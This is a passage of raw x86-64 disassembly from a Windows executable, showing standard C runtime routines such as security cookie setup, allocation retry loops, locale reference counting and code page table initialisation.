   140005d6c:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140005d71:	44 8b d8             	mov    %eax,%r11d
   140005d74:	49 33 db             	xor    %r11,%rbx
   140005d77:	ff 15 ab 84 00 00    	call   *0x84ab(%rip)        # 0x14000e228
   140005d7d:	4c 8b 5c 24 38       	mov    0x38(%rsp),%r11
   140005d82:	4c 33 db             	xor    %rbx,%r11
   140005d85:	48 b8 ff ff ff ff ff 	movabs $0xffffffffffff,%rax
   140005d8c:	ff 00 00 
   140005d8f:	4c 23 d8             	and    %rax,%r11
   140005d92:	48 b8 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rax
   140005d99:	2b 00 00 
   140005d9c:	4c 3b df             	cmp    %rdi,%r11
   140005d9f:	4c 0f 44 d8          	cmove  %rax,%r11
   140005da3:	4c 89 1d 9e d2 00 00 	mov    %r11,0xd29e(%rip)        # 0x140013048
   140005daa:	49 f7 d3             	not    %r11
   140005dad:	4c 89 1d 9c d2 00 00 	mov    %r11,0xd29c(%rip)        # 0x140013050
   140005db4:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005db9:	48 83 c4 20          	add    $0x20,%rsp
   140005dbd:	5f                   	pop    %rdi
   140005dbe:	c3                   	ret
   140005dbf:	cc                   	int3
   140005dc0:	83 25 9d 07 01 00 00 	andl   $0x0,0x1079d(%rip)        # 0x140016564
   140005dc7:	c3                   	ret
   140005dc8:	cc                   	int3
   140005dc9:	cc                   	int3
   140005dca:	cc                   	int3
   140005dcb:	cc                   	int3
   140005dcc:	cc                   	int3
   140005dcd:	cc                   	int3
   140005dce:	cc                   	int3
   140005dcf:	cc                   	int3
   140005dd0:	cc                   	int3
   140005dd1:	cc                   	int3
   140005dd2:	cc                   	int3
   140005dd3:	cc                   	int3
   140005dd4:	cc                   	int3
   140005dd5:	cc                   	int3
   140005dd6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140005ddd:	00 00 00 
   140005de0:	48 81 ec d8 04 00 00 	sub    $0x4d8,%rsp
   140005de7:	4d 33 c0             	xor    %r8,%r8
   140005dea:	4d 33 c9             	xor    %r9,%r9
   140005ded:	48 89 64 24 20       	mov    %rsp,0x20(%rsp)
   140005df2:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   140005df7:	e8 f0 47 00 00       	call   0x14000a5ec
   140005dfc:	48 81 c4 d8 04 00 00 	add    $0x4d8,%rsp
   140005e03:	c3                   	ret
   140005e04:	cc                   	int3
   140005e05:	cc                   	int3
   140005e06:	cc                   	int3
   140005e07:	cc                   	int3
   140005e08:	cc                   	int3
   140005e09:	cc                   	int3
   140005e0a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140005e10:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140005e15:	48 89 54 24 18       	mov    %rdx,0x18(%rsp)
   140005e1a:	44 89 44 24 10       	mov    %r8d,0x10(%rsp)
   140005e1f:	49 c7 c1 20 05 93 19 	mov    $0x19930520,%r9
   140005e26:	eb 08                	jmp    0x140005e30
   140005e28:	cc                   	int3
   140005e29:	cc                   	int3
   140005e2a:	cc                   	int3
   140005e2b:	cc                   	int3
   140005e2c:	cc                   	int3
   140005e2d:	cc                   	int3
   140005e2e:	66 90                	xchg   %ax,%ax
   140005e30:	c3                   	ret
   140005e31:	cc                   	int3
   140005e32:	cc                   	int3
   140005e33:	cc                   	int3
   140005e34:	cc                   	int3
   140005e35:	cc                   	int3
   140005e36:	cc                   	int3
   140005e37:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140005e3e:	00 00 
   140005e40:	c3                   	ret
   140005e41:	cc                   	int3
   140005e42:	cc                   	int3
   140005e43:	cc                   	int3
   140005e44:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005e49:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005e4e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005e53:	57                   	push   %rdi
   140005e54:	48 83 ec 20          	sub    $0x20,%rsp
   140005e58:	33 ff                	xor    %edi,%edi
   140005e5a:	48 8b f1             	mov    %rcx,%rsi
   140005e5d:	83 cd ff             	or     $0xffffffff,%ebp
   140005e60:	48 8b ce             	mov    %rsi,%rcx
   140005e63:	e8 38 ca ff ff       	call   0x1400028a0
   140005e68:	48 8b d8             	mov    %rax,%rbx
   140005e6b:	48 85 c0             	test   %rax,%rax
   140005e6e:	75 28                	jne    0x140005e98
   140005e70:	39 05 76 f4 00 00    	cmp    %eax,0xf476(%rip)        # 0x1400152ec
   140005e76:	76 20                	jbe    0x140005e98
   140005e78:	8b cf                	mov    %edi,%ecx
   140005e7a:	ff 15 98 81 00 00    	call   *0x8198(%rip)        # 0x14000e018
   140005e80:	44 8d 9f e8 03 00 00 	lea    0x3e8(%rdi),%r11d
   140005e87:	44 3b 1d 5e f4 00 00 	cmp    0xf45e(%rip),%r11d        # 0x1400152ec
   140005e8e:	41 8b fb             	mov    %r11d,%edi
   140005e91:	0f 47 fd             	cmova  %ebp,%edi
   140005e94:	3b fd                	cmp    %ebp,%edi
   140005e96:	75 c8                	jne    0x140005e60
   140005e98:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140005e9d:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140005ea2:	48 8b c3             	mov    %rbx,%rax
   140005ea5:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005eaa:	48 83 c4 20          	add    $0x20,%rsp
   140005eae:	5f                   	pop    %rdi
   140005eaf:	c3                   	ret
   140005eb0:	48 8b c4             	mov    %rsp,%rax
   140005eb3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140005eb7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140005ebb:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140005ebf:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140005ec3:	41 54                	push   %r12
   140005ec5:	48 83 ec 20          	sub    $0x20,%rsp
   140005ec9:	33 ff                	xor    %edi,%edi
   140005ecb:	48 8b f2             	mov    %rdx,%rsi
   140005ece:	48 8b e9             	mov    %rcx,%rbp
   140005ed1:	41 83 cc ff          	or     $0xffffffff,%r12d
   140005ed5:	45 33 c0             	xor    %r8d,%r8d
   140005ed8:	48 8b d6             	mov    %rsi,%rdx
   140005edb:	48 8b cd             	mov    %rbp,%rcx
   140005ede:	e8 85 25 00 00       	call   0x140008468
   140005ee3:	48 8b d8             	mov    %rax,%rbx
   140005ee6:	48 85 c0             	test   %rax,%rax
   140005ee9:	75 2a                	jne    0x140005f15
   140005eeb:	39 05 fb f3 00 00    	cmp    %eax,0xf3fb(%rip)        # 0x1400152ec
   140005ef1:	76 22                	jbe    0x140005f15
   140005ef3:	8b cf                	mov    %edi,%ecx
   140005ef5:	ff 15 1d 81 00 00    	call   *0x811d(%rip)        # 0x14000e018
   140005efb:	44 8d 9f e8 03 00 00 	lea    0x3e8(%rdi),%r11d
   140005f02:	44 3b 1d e3 f3 00 00 	cmp    0xf3e3(%rip),%r11d        # 0x1400152ec
   140005f09:	41 8b fb             	mov    %r11d,%edi
   140005f0c:	41 0f 47 fc          	cmova  %r12d,%edi
   140005f10:	41 3b fc             	cmp    %r12d,%edi
   140005f13:	75 c0                	jne    0x140005ed5
   140005f15:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140005f1a:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140005f1f:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140005f24:	48 8b c3             	mov    %rbx,%rax
   140005f27:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005f2c:	48 83 c4 20          	add    $0x20,%rsp
   140005f30:	41 5c                	pop    %r12
   140005f32:	c3                   	ret
   140005f33:	cc                   	int3
   140005f34:	48 8b c4             	mov    %rsp,%rax
   140005f37:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140005f3b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140005f3f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140005f43:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140005f47:	41 54                	push   %r12
   140005f49:	48 83 ec 20          	sub    $0x20,%rsp
   140005f4d:	33 f6                	xor    %esi,%esi
   140005f4f:	48 8b fa             	mov    %rdx,%rdi
   140005f52:	48 8b e9             	mov    %rcx,%rbp
   140005f55:	41 83 cc ff          	or     $0xffffffff,%r12d
   140005f59:	48 8b d7             	mov    %rdi,%rdx
   140005f5c:	48 8b cd             	mov    %rbp,%rcx
   140005f5f:	e8 b4 25 00 00       	call   0x140008518
   140005f64:	48 8b d8             	mov    %rax,%rbx
   140005f67:	48 85 c0             	test   %rax,%rax
   140005f6a:	75 2f                	jne    0x140005f9b
   140005f6c:	48 85 ff             	test   %rdi,%rdi
   140005f6f:	74 2a                	je     0x140005f9b
   140005f71:	39 05 75 f3 00 00    	cmp    %eax,0xf375(%rip)        # 0x1400152ec
   140005f77:	76 22                	jbe    0x140005f9b
   140005f79:	8b ce                	mov    %esi,%ecx
   140005f7b:	ff 15 97 80 00 00    	call   *0x8097(%rip)        # 0x14000e018
   140005f81:	44 8d 9e e8 03 00 00 	lea    0x3e8(%rsi),%r11d
   140005f88:	44 3b 1d 5d f3 00 00 	cmp    0xf35d(%rip),%r11d        # 0x1400152ec
   140005f8f:	41 8b f3             	mov    %r11d,%esi
   140005f92:	41 0f 47 f4          	cmova  %r12d,%esi
   140005f96:	41 3b f4             	cmp    %r12d,%esi
   140005f99:	75 be                	jne    0x140005f59
   140005f9b:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140005fa0:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140005fa5:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140005faa:	48 8b c3             	mov    %rbx,%rax
   140005fad:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005fb2:	48 83 c4 20          	add    $0x20,%rsp
   140005fb6:	41 5c                	pop    %r12
   140005fb8:	c3                   	ret
   140005fb9:	cc                   	int3
   140005fba:	cc                   	int3
   140005fbb:	cc                   	int3
   140005fbc:	48 83 ec 38          	sub    $0x38,%rsp
   140005fc0:	48 85 c9             	test   %rcx,%rcx
   140005fc3:	75 26                	jne    0x140005feb
   140005fc5:	e8 da d0 ff ff       	call   0x1400030a4
   140005fca:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140005fd0:	45 33 c9             	xor    %r9d,%r9d
   140005fd3:	45 33 c0             	xor    %r8d,%r8d
   140005fd6:	33 d2                	xor    %edx,%edx
   140005fd8:	33 c9                	xor    %ecx,%ecx
   140005fda:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140005fe0:	e8 ef cf ff ff       	call   0x140002fd4
   140005fe5:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140005fe9:	eb 12                	jmp    0x140005ffd
   140005feb:	4c 8b c1             	mov    %rcx,%r8
   140005fee:	48 8b 0d 7b f2 00 00 	mov    0xf27b(%rip),%rcx        # 0x140015270
   140005ff5:	33 d2                	xor    %edx,%edx
   140005ff7:	ff 15 43 82 00 00    	call   *0x8243(%rip)        # 0x14000e240
   140005ffd:	48 83 c4 38          	add    $0x38,%rsp
   140006001:	c3                   	ret
   140006002:	cc                   	int3
   140006003:	cc                   	int3
   140006004:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006009:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000600e:	57                   	push   %rdi
   14000600f:	48 83 ec 20          	sub    $0x20,%rsp
   140006013:	48 8b 81 28 01 00 00 	mov    0x128(%rcx),%rax
   14000601a:	48 8b d9             	mov    %rcx,%rbx
   14000601d:	48 85 c0             	test   %rax,%rax
   140006020:	74 79                	je     0x14000609b
   140006022:	48 8d 0d 87 e2 00 00 	lea    0xe287(%rip),%rcx        # 0x1400142b0
   140006029:	48 3b c1             	cmp    %rcx,%rax
   14000602c:	74 6d                	je     0x14000609b
   14000602e:	48 8b 83 10 01 00 00 	mov    0x110(%rbx),%rax
   140006035:	48 85 c0             	test   %rax,%rax
   140006038:	74 61                	je     0x14000609b
   14000603a:	83 38 00             	cmpl   $0x0,(%rax)
   14000603d:	75 5c                	jne    0x14000609b
   14000603f:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   140006046:	48 85 c9             	test   %rcx,%rcx
   140006049:	74 16                	je     0x140006061
   14000604b:	83 39 00             	cmpl   $0x0,(%rcx)
   14000604e:	75 11                	jne    0x140006061
   140006050:	e8 c3 c9 ff ff       	call   0x140002a18
   140006055:	48 8b 8b 28 01 00 00 	mov    0x128(%rbx),%rcx
   14000605c:	e8 bf 27 00 00       	call   0x140008820
   140006061:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   140006068:	48 85 c9             	test   %rcx,%rcx
   14000606b:	74 16                	je     0x140006083
   14000606d:	83 39 00             	cmpl   $0x0,(%rcx)
   140006070:	75 11                	jne    0x140006083
   140006072:	e8 a1 c9 ff ff       	call   0x140002a18
   140006077:	48 8b 8b 28 01 00 00 	mov    0x128(%rbx),%rcx
   14000607e:	e8 55 27 00 00       	call   0x1400087d8
   140006083:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   14000608a:	e8 89 c9 ff ff       	call   0x140002a18
   14000608f:	48 8b 8b 28 01 00 00 	mov    0x128(%rbx),%rcx
   140006096:	e8 7d c9 ff ff       	call   0x140002a18
   14000609b:	48 8b 83 30 01 00 00 	mov    0x130(%rbx),%rax
   1400060a2:	48 85 c0             	test   %rax,%rax
   1400060a5:	74 47                	je     0x1400060ee
   1400060a7:	83 38 00             	cmpl   $0x0,(%rax)
   1400060aa:	75 42                	jne    0x1400060ee
   1400060ac:	48 8b 8b 38 01 00 00 	mov    0x138(%rbx),%rcx
   1400060b3:	48 81 e9 fe 00 00 00 	sub    $0xfe,%rcx
   1400060ba:	e8 59 c9 ff ff       	call   0x140002a18
   1400060bf:	48 8b 8b 48 01 00 00 	mov    0x148(%rbx),%rcx
   1400060c6:	bf 80 00 00 00       	mov    $0x80,%edi
   1400060cb:	48 2b cf             	sub    %rdi,%rcx
   1400060ce:	e8 45 c9 ff ff       	call   0x140002a18
   1400060d3:	48 8b 8b 50 01 00 00 	mov    0x150(%rbx),%rcx
   1400060da:	48 2b cf             	sub    %rdi,%rcx
   1400060dd:	e8 36 c9 ff ff       	call   0x140002a18
   1400060e2:	48 8b 8b 30 01 00 00 	mov    0x130(%rbx),%rcx
   1400060e9:	e8 2a c9 ff ff       	call   0x140002a18
   1400060ee:	48 8b 8b 58 01 00 00 	mov    0x158(%rbx),%rcx
   1400060f5:	48 8d 05 34 e0 00 00 	lea    0xe034(%rip),%rax        # 0x140014130
   1400060fc:	48 3b c8             	cmp    %rax,%rcx
   1400060ff:	74 1a                	je     0x14000611b
   140006101:	83 b9 60 01 00 00 00 	cmpl   $0x0,0x160(%rcx)
   140006108:	75 11                	jne    0x14000611b
   14000610a:	e8 dd 24 00 00       	call   0x1400085ec
   14000610f:	48 8b 8b 58 01 00 00 	mov    0x158(%rbx),%rcx
   140006116:	e8 fd c8 ff ff       	call   0x140002a18
   14000611b:	48 8d 7b 58          	lea    0x58(%rbx),%rdi
   14000611f:	be 06 00 00 00       	mov    $0x6,%esi
   140006124:	48 8d 05 55 d5 00 00 	lea    0xd555(%rip),%rax        # 0x140013680
   14000612b:	48 39 47 f0          	cmp    %rax,-0x10(%rdi)
   14000612f:	74 12                	je     0x140006143
   140006131:	48 8b 0f             	mov    (%rdi),%rcx
   140006134:	48 85 c9             	test   %rcx,%rcx
   140006137:	74 0a                	je     0x140006143
   140006139:	83 39 00             	cmpl   $0x0,(%rcx)
   14000613c:	75 05                	jne    0x140006143
   14000613e:	e8 d5 c8 ff ff       	call   0x140002a18
   140006143:	48 83 7f f8 00       	cmpq   $0x0,-0x8(%rdi)
   140006148:	74 13                	je     0x14000615d
   14000614a:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   14000614e:	48 85 c9             	test   %rcx,%rcx
   140006151:	74 0a                	je     0x14000615d
   140006153:	83 39 00             	cmpl   $0x0,(%rcx)
   140006156:	75 05                	jne    0x14000615d
   140006158:	e8 bb c8 ff ff       	call   0x140002a18
   14000615d:	48 83 c7 20          	add    $0x20,%rdi
   140006161:	48 83 ee 01          	sub    $0x1,%rsi
   140006165:	75 bd                	jne    0x140006124
   140006167:	48 8b cb             	mov    %rbx,%rcx
   14000616a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000616f:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140006174:	48 83 c4 20          	add    $0x20,%rsp
   140006178:	5f                   	pop    %rdi
   140006179:	e9 9a c8 ff ff       	jmp    0x140002a18
   14000617e:	cc                   	int3
   14000617f:	cc                   	int3
   140006180:	f0 83 01 01          	lock addl $0x1,(%rcx)
   140006184:	48 8b 81 10 01 00 00 	mov    0x110(%rcx),%rax
   14000618b:	48 85 c0             	test   %rax,%rax
   14000618e:	74 04                	je     0x140006194
   140006190:	f0 83 00 01          	lock addl $0x1,(%rax)
   140006194:	48 8b 81 20 01 00 00 	mov    0x120(%rcx),%rax
   14000619b:	48 85 c0             	test   %rax,%rax
   14000619e:	74 04                	je     0x1400061a4
   1400061a0:	f0 83 00 01          	lock addl $0x1,(%rax)
   1400061a4:	48 8b 81 18 01 00 00 	mov    0x118(%rcx),%rax
   1400061ab:	48 85 c0             	test   %rax,%rax
   1400061ae:	74 04                	je     0x1400061b4
   1400061b0:	f0 83 00 01          	lock addl $0x1,(%rax)
   1400061b4:	48 8b 81 30 01 00 00 	mov    0x130(%rcx),%rax
   1400061bb:	48 85 c0             	test   %rax,%rax
   1400061be:	74 04                	je     0x1400061c4
   1400061c0:	f0 83 00 01          	lock addl $0x1,(%rax)
   1400061c4:	48 8d 41 58          	lea    0x58(%rcx),%rax
   1400061c8:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   1400061ce:	48 8d 15 ab d4 00 00 	lea    0xd4ab(%rip),%rdx        # 0x140013680
   1400061d5:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   1400061d9:	74 0c                	je     0x1400061e7
   1400061db:	48 8b 10             	mov    (%rax),%rdx
   1400061de:	48 85 d2             	test   %rdx,%rdx
   1400061e1:	74 04                	je     0x1400061e7
   1400061e3:	f0 83 02 01          	lock addl $0x1,(%rdx)
   1400061e7:	48 83 78 f8 00       	cmpq   $0x0,-0x8(%rax)
   1400061ec:	74 0d                	je     0x1400061fb
   1400061ee:	48 8b 50 08          	mov    0x8(%rax),%rdx
   1400061f2:	48 85 d2             	test   %rdx,%rdx
   1400061f5:	74 04                	je     0x1400061fb
   1400061f7:	f0 83 02 01          	lock addl $0x1,(%rdx)
   1400061fb:	48 83 c0 20          	add    $0x20,%rax
   1400061ff:	49 83 e8 01          	sub    $0x1,%r8
   140006203:	75 c9                	jne    0x1400061ce
   140006205:	48 8b 81 58 01 00 00 	mov    0x158(%rcx),%rax
   14000620c:	f0 83 80 60 01 00 00 	lock addl $0x1,0x160(%rax)
   140006213:	01 
   140006214:	c3                   	ret
   140006215:	cc                   	int3
   140006216:	cc                   	int3
   140006217:	cc                   	int3
   140006218:	48 85 c9             	test   %rcx,%rcx
   14000621b:	0f 84 98 00 00 00    	je     0x1400062b9
   140006221:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140006225:	f0 44 01 09          	lock add %r9d,(%rcx)
   140006229:	48 8b 81 10 01 00 00 	mov    0x110(%rcx),%rax
   140006230:	48 85 c0             	test   %rax,%rax
   140006233:	74 04                	je     0x140006239
   140006235:	f0 44 01 08          	lock add %r9d,(%rax)
   140006239:	48 8b 81 20 01 00 00 	mov    0x120(%rcx),%rax
   140006240:	48 85 c0             	test   %rax,%rax
   140006243:	74 04                	je     0x140006249
   140006245:	f0 44 01 08          	lock add %r9d,(%rax)
   140006249:	48 8b 81 18 01 00 00 	mov    0x118(%rcx),%rax
   140006250:	48 85 c0             	test   %rax,%rax
   140006253:	74 04                	je     0x140006259
   140006255:	f0 44 01 08          	lock add %r9d,(%rax)
   140006259:	48 8b 81 30 01 00 00 	mov    0x130(%rcx),%rax
   140006260:	48 85 c0             	test   %rax,%rax
   140006263:	74 04                	je     0x140006269
   140006265:	f0 44 01 08          	lock add %r9d,(%rax)
   140006269:	48 8d 41 58          	lea    0x58(%rcx),%rax
   14000626d:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140006273:	48 8d 15 06 d4 00 00 	lea    0xd406(%rip),%rdx        # 0x140013680
   14000627a:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   14000627e:	74 0c                	je     0x14000628c
   140006280:	48 8b 10             	mov    (%rax),%rdx
   140006283:	48 85 d2             	test   %rdx,%rdx
   140006286:	74 04                	je     0x14000628c
   140006288:	f0 44 01 0a          	lock add %r9d,(%rdx)
   14000628c:	48 83 78 f8 00       	cmpq   $0x0,-0x8(%rax)
   140006291:	74 0d                	je     0x1400062a0
   140006293:	48 8b 50 08          	mov    0x8(%rax),%rdx
   140006297:	48 85 d2             	test   %rdx,%rdx
   14000629a:	74 04                	je     0x1400062a0
   14000629c:	f0 44 01 0a          	lock add %r9d,(%rdx)
   1400062a0:	48 83 c0 20          	add    $0x20,%rax
   1400062a4:	49 83 e8 01          	sub    $0x1,%r8
   1400062a8:	75 c9                	jne    0x140006273
   1400062aa:	48 8b 81 58 01 00 00 	mov    0x158(%rcx),%rax
   1400062b1:	f0 44 01 88 60 01 00 	lock add %r9d,0x160(%rax)
   1400062b8:	00 
   1400062b9:	48 8b c1             	mov    %rcx,%rax
   1400062bc:	c3                   	ret
   1400062bd:	cc                   	int3
   1400062be:	cc                   	int3
   1400062bf:	cc                   	int3
   1400062c0:	40 53                	rex push %rbx
   1400062c2:	48 83 ec 20          	sub    $0x20,%rsp
   1400062c6:	48 8b da             	mov    %rdx,%rbx
   1400062c9:	48 85 d2             	test   %rdx,%rdx
   1400062cc:	74 41                	je     0x14000630f
   1400062ce:	48 85 c9             	test   %rcx,%rcx
   1400062d1:	74 3c                	je     0x14000630f
   1400062d3:	4c 8b 11             	mov    (%rcx),%r10
   1400062d6:	4c 3b d2             	cmp    %rdx,%r10
   1400062d9:	74 2f                	je     0x14000630a
   1400062db:	48 89 11             	mov    %rdx,(%rcx)
   1400062de:	48 8b ca             	mov    %rdx,%rcx
   1400062e1:	e8 9a fe ff ff       	call   0x140006180
   1400062e6:	4d 85 d2             	test   %r10,%r10
   1400062e9:	74 1f                	je     0x14000630a
   1400062eb:	49 8b ca             	mov    %r10,%rcx
   1400062ee:	e8 25 ff ff ff       	call   0x140006218
   1400062f3:	41 83 3a 00          	cmpl   $0x0,(%r10)
   1400062f7:	75 11                	jne    0x14000630a
   1400062f9:	48 8d 05 90 d3 00 00 	lea    0xd390(%rip),%rax        # 0x140013690
   140006300:	4c 3b d0             	cmp    %rax,%r10
   140006303:	74 05                	je     0x14000630a
   140006305:	e8 fa fc ff ff       	call   0x140006004
   14000630a:	48 8b c3             	mov    %rbx,%rax
   14000630d:	eb 02                	jmp    0x140006311
   14000630f:	33 c0                	xor    %eax,%eax
   140006311:	48 83 c4 20          	add    $0x20,%rsp
   140006315:	5b                   	pop    %rbx
   140006316:	c3                   	ret
   140006317:	cc                   	int3
   140006318:	40 53                	rex push %rbx
   14000631a:	48 83 ec 20          	sub    $0x20,%rsp
   14000631e:	e8 ed d2 ff ff       	call   0x140003610
   140006323:	48 8b d8             	mov    %rax,%rbx
   140006326:	8b 88 c8 00 00 00    	mov    0xc8(%rax),%ecx
   14000632c:	85 0d de dd 00 00    	test   %ecx,0xddde(%rip)        # 0x140014110
   140006332:	74 18                	je     0x14000634c
   140006334:	48 83 b8 c0 00 00 00 	cmpq   $0x0,0xc0(%rax)
   14000633b:	00 
   14000633c:	74 0e                	je     0x14000634c
   14000633e:	e8 cd d2 ff ff       	call   0x140003610
   140006343:	48 8b 98 c0 00 00 00 	mov    0xc0(%rax),%rbx
   14000634a:	eb 2b                	jmp    0x140006377
   14000634c:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140006351:	e8 16 d9 ff ff       	call   0x140003c6c
   140006356:	90                   	nop
   140006357:	48 8d 8b c0 00 00 00 	lea    0xc0(%rbx),%rcx
   14000635e:	48 8b 15 8b d4 00 00 	mov    0xd48b(%rip),%rdx        # 0x1400137f0
   140006365:	e8 56 ff ff ff       	call   0x1400062c0
   14000636a:	48 8b d8             	mov    %rax,%rbx
   14000636d:	b9 0c 00 00 00       	mov    $0xc,%ecx
   140006372:	e8 f5 d7 ff ff       	call   0x140003b6c
   140006377:	48 85 db             	test   %rbx,%rbx
   14000637a:	75 08                	jne    0x140006384
   14000637c:	8d 4b 20             	lea    0x20(%rbx),%ecx
   14000637f:	e8 00 bc ff ff       	call   0x140001f84
   140006384:	48 8b c3             	mov    %rbx,%rax
   140006387:	48 83 c4 20          	add    $0x20,%rsp
   14000638b:	5b                   	pop    %rbx
   14000638c:	c3                   	ret
   14000638d:	cc                   	int3
   14000638e:	cc                   	int3
   14000638f:	cc                   	int3
   140006390:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006395:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000639a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000639f:	57                   	push   %rdi
   1400063a0:	48 83 ec 20          	sub    $0x20,%rsp
   1400063a4:	48 8d 59 1c          	lea    0x1c(%rcx),%rbx
   1400063a8:	48 8b e9             	mov    %rcx,%rbp
   1400063ab:	be 01 01 00 00       	mov    $0x101,%esi
   1400063b0:	48 8b cb             	mov    %rbx,%rcx
   1400063b3:	4c 8b c6             	mov    %rsi,%r8
   1400063b6:	33 d2                	xor    %edx,%edx
   1400063b8:	e8 b3 c6 ff ff       	call   0x140002a70
   1400063bd:	45 33 db             	xor    %r11d,%r11d
   1400063c0:	48 8d 7d 10          	lea    0x10(%rbp),%rdi
   1400063c4:	41 8d 4b 06          	lea    0x6(%r11),%ecx
   1400063c8:	41 0f b7 c3          	movzwl %r11w,%eax
   1400063cc:	44 89 5d 04          	mov    %r11d,0x4(%rbp)
   1400063d0:	44 89 5d 08          	mov    %r11d,0x8(%rbp)
   1400063d4:	44 89 5d 0c          	mov    %r11d,0xc(%rbp)
   1400063d8:	66 f3 ab             	rep stos %ax,(%rdi)
   1400063db:	48 8d 3d 2e d4 00 00 	lea    0xd42e(%rip),%rdi        # 0x140013810
   1400063e2:	48 2b fd             	sub    %rbp,%rdi
   1400063e5:	8a 04 1f             	mov    (%rdi,%rbx,1),%al
   1400063e8:	88 03                	mov    %al,(%rbx)
   1400063ea:	48 ff c3             	inc    %rbx
   1400063ed:	48 83 ee 01          	sub    $0x1,%rsi
   1400063f1:	75 f2                	jne    0x1400063e5
   1400063f3:	48 8d 8d 1d 01 00 00 	lea    0x11d(%rbp),%rcx
   1400063fa:	ba 00 01 00 00       	mov    $0x100,%edx
   1400063ff:	8a 04 39             	mov    (%rcx,%rdi,1),%al
   140006402:	88 01                	mov    %al,(%rcx)
   140006404:	48 ff c1             	inc    %rcx
   140006407:	48 83 ea 01          	sub    $0x1,%rdx
   14000640b:	75 f2                	jne    0x1400063ff
   14000640d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140006412:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140006417:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000641c:	48 83 c4 20          	add    $0x20,%rsp
   140006420:	5f                   	pop    %rdi
   140006421:	c3                   	ret
   140006422:	cc                   	int3
   140006423:	cc                   	int3
   140006424:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006429:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000642e:	57                   	push   %rdi
   14000642f:	48 81 ec 80 05 00 00 	sub    $0x580,%rsp
   140006436:	48 8b 05 0b cc 00 00 	mov    0xcc0b(%rip),%rax        # 0x140013048
   14000643d:	48 33 c4             	xor    %rsp,%rax
   140006440:	48 89 84 24 70 05 00 	mov    %rax,0x570(%rsp)
   140006447:	00 
   140006448:	48 8b f1             	mov    %rcx,%rsi
   14000644b:	8b 49 04             	mov    0x4(%rcx),%ecx
   14000644e:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140006453:	ff 15 ef 7d 00 00    	call   *0x7def(%rip)        # 0x14000e248
   140006459:	bb 00 01 00 00       	mov    $0x100,%ebx
   14000645e:	85 c0                	test   %eax,%eax
   140006460:	0f 84 3d 01 00 00    	je     0x1400065a3
   140006466:	33 c0                	xor    %eax,%eax
   140006468:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   14000646d:	88 02                	mov    %al,(%rdx)
   14000646f:	ff c0                	inc    %eax
   140006471:	48 ff c2             	inc    %rdx
   140006474:	3b c3                	cmp    %ebx,%eax
   140006476:	72 f5                	jb     0x14000646d
   140006478:	8a 44 24 56          	mov    0x56(%rsp),%al
   14000647c:	c6 44 24 70 20       	movb   $0x20,0x70(%rsp)
   140006481:	48 8d 7c 24 56       	lea    0x56(%rsp),%rdi
   140006486:	eb 29                	jmp    0x1400064b1
   140006488:	0f b6 57 01          	movzbl 0x1(%rdi),%edx
   14000648c:	44 0f b6 c0          	movzbl %al,%r8d
   140006490:	44 3b c2             	cmp    %edx,%r8d
   140006493:	77 16                	ja     0x1400064ab
   140006495:	41 2b d0             	sub    %r8d,%edx
   140006498:	49 8b c0             	mov    %r8,%rax
   14000649b:	4a 8d 4c 04 70       	lea    0x70(%rsp,%r8,1),%rcx
   1400064a0:	44 8d 42 01          	lea    0x1(%rdx),%r8d
